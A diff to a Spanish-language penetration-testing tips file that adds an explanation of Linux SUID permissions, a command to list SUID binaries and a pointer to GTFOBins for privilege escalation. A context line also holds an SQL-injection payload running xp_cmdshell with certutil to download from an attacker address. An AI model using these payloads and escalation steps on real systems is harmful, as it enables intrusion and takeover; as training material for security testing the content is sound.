@@ -793,6 +793,13 @@ inyeccion';EXEC xp_cmdshell 'certutil -urlcache -f http://10.10.X.X';--
 Para una mayor información visitar el siguiente enlace: https://www.tarlogic.com/es/blog/red-team-tales-0x01/ , también es comun que los comandos no se ejecuten de forma de "stacked querys"
 ## Tip #22: Acceso a una maquina mediante autorized_keys
 ## Tip #23: Abuso de SUID para escalar privilegios
+SUID (Set User ID) es un tipo de permiso en Linux que permite a un archivo ejecutable ser ejecutado con los privilegios del propietario del archivo, en lugar de los del usuario que lo ejecuta. Esto es útil en casos donde se necesita que un programa realice tareas que requieren permisos elevados, como cambiar configuraciones del sistema o acceder a archivos restringidos, pero sin que el usuario tenga acceso directo a esos permisos. Por ejemplo, un programa con SUID establecido, aunque ejecutado por un usuario normal, se ejecutará con los privilegios del usuario root.
+
+Para obtener todos los binarios con el SUID de root ejecutaremos el siguiente comando:
+```bash
+find / -perm -4000 2>/dev/null
+```
+Después de obtener la lista buscaremos si alguno se se encuentran en la siguiente página -> https://gtfobins.github.io/, si es así, solo basta con seguir los comandos sugeridos para obtener una elevación de privilegios o movimiento lateral. 
 ## Tip #24: Patrones personalizados en Hashcat
 Si en algun momento obtienes un hash y ademas conoces el patrón del mismo puedes especificarselo a hashcat para que lo obtenga, por ejemplo veamos el siguiente caso de estudio:
 ### Caso de estudio
